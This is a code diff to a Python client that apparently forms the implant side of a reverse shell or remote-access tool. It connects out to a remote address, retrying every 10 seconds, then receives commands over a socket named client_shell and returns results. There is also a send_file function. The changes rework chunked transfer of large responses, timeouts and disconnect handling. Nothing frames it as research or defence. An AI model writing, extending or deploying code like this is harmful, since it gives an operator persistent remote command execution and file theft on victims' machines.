@@ -1,3 +1,4 @@
+import io
 import socket
 import time
 import os
@@ -16,11 +17,10 @@ running = True
 
 
 def send(conn, msg):
-    more = False
     msg_encoded = msg.encode(FORMAT)
     if len(msg_encoded) > 1000:
-        msg_encoded = b"MORE" + msg_encoded[:1000]
-        more = True
+        send_large_response(msg, conn)
+        return
     msg_len = len(msg_encoded)
     msg_len_encoded = str(msg_len).encode(FORMAT)
     msg_len_encoded += b" " * (HEADER - len(str(msg_len)))
@@ -30,7 +30,18 @@ def send(conn, msg):
     except:
         raise
     print(msg_encoded.decode(FORMAT))
-    if more: send(conn, msg[1000:])
+
+
+def send_large_response(msg, conn):
+    send(conn, "LARGE_RESPONSE")
+    buffer = msg.encode(FORMAT)[:1024]
+    cursor = 1024
+    while buffer:
+        conn.send(buffer)
+        print(buffer)
+        buffer = msg[cursor:cursor+1024].encode(FORMAT)
+        cursor += 1024
+    print("doneee")
 
 
 def receive(conn):
@@ -39,14 +50,23 @@ def receive(conn):
     except socket.timeout:
         raise socket.timeout()
     except:
-        return "error"
+        raise socket.timeout()
     if not msg_len: return ""
     msg_len = int(msg_len)
     if msg_len == 0: return ""
     msg = conn.recv(msg_len).decode(FORMAT)
-    if msg.startswith("MORE"):
-        msg = msg[4:] + receive(conn)
+    if msg.startswith("LARGE_RESPONSE"):
+        msg = receive_large_response(conn)
     return msg
+
+
+def receive_large_response(conn):
+    recv_buffer = conn.recv(1024)
+    msg = b""
+    while recv_buffer:
+        msg += recv_buffer
+        recv_buffer = conn.recv(1024)
+    return msg.decode(FORMAT)
 
 
 def connect(addr):
@@ -54,7 +74,7 @@ def connect(addr):
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             client.connect(addr)
-            client.settimeout(10)
+            client.settimeout(5)
             return client
         except:
             time.sleep(10)
@@ -72,7 +92,7 @@ def send_file(path):
 
 def is_still_connected(sock):
     try:
-        sock.sendall(b"")
+        sock.send(b"")
     except:
         return False
     return True
@@ -85,18 +105,21 @@ def main():
         while True:
             command = ""
             output = ""
+            if not is_still_connected(client_shell): break
             try:
                 command = receive(client_shell)
             except socket.timeout:
-                if not is_still_connected(client_shell): break
                 continue
             if command == "":
-                continue
+                # this happens if the server is stopped
+                break
             elif command == "disconnect":
                 continue
             split_command = command.split()
             if command.lower() == "exit":
                 # if the command is exit, just break out of the loop
+                break
+            elif command.lower() == "stop":
                 break
             elif command.lower().strip() == "cd":
                 send(client_shell, os.getcwd())
